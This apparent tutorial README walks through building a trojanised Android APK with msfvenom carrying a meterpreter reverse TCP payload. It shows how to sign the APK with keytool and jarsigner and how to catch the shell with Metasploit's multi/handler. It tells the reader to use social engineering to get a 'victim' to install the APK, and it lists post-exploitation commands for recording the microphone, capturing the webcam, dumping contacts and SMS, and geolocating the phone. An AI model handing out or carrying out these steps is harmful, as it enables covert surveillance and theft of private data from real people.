# Android_Hacking_Metasploit

Msfvenom is an android hacking framework used for making hacking apk files that have embedded reverse shells which can be used for hacking android devices.

This tool was not present in backtrack but is now present in Kali Linux as a separate option to make android hacking as easy as possible. We will be using Metasploit and msfvenom together for this hack.

Metasploit built by rapid7 is a community-based project. It has numerous exploits and hacks made and optimized by the community. The best part is that it is free. To show how effective it is, so lets hack an android device with Metasploit and msfvenom.

**Step 1: Creating a malicious apk file**
Open your KALI LINUX. Open your Terminal and type in the following command


# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.78.129 LPORT=4444 R > myapp.apk

**LHOST= YOUR IP address

**LPORT= 4444

**Use ifconfig to find your IP address if you don`t know.

# ifconfig

**Step 2: Delivering APK file to the victim**
You have now created your malicious spyware .apk file using Metasploit and msfvenom. It will be saved to your /home/ folder by default. Find your newly created hackingworld.apk and send it to your target (hackingworld.apk). Use social engineering to do this so that the victim does install the apk.

**If you get any signing errors or issues use the following:

Keytool (Comes Pre-Installed in Kali Linux)

keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

Jarsigner (Comes Pre-Installed in Kali Linux)

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore hackingworld.apk aliasname

jarsigner -verify -verbose -certs hackingworld.apky

**Step 3: Metasploit setup**

# msfconsole

Now in the Metasploit framework console type the following

msf  > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.78.129
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit

Here

**LHOST= YOUR IP address

**LPORT= 4444

**Step 4: Exploit..!!!**
The moment the victim opens the application on their device, you will get a meterpreter shell on the Kali Linux terminal.

You have now successfully hacked the android device using Metasploit and msfvenom

Some commands you should try using Metasploit and msfvenom:

– record_mic

Records the audio from the android device and stores it on the local drive.

– webcam_snap

Lets you take the images by hacking the android camera of the device

– webcam_stream

Lets you stream live video from the hacked android camera

– dump_contacts

Lets you hack and copy all the contacts from the victim’s phone.

– dump_sms

Lets you hack the victim’s messages and stored it in a text file on your system.

– geolocate

Helps you track the hacked device by location
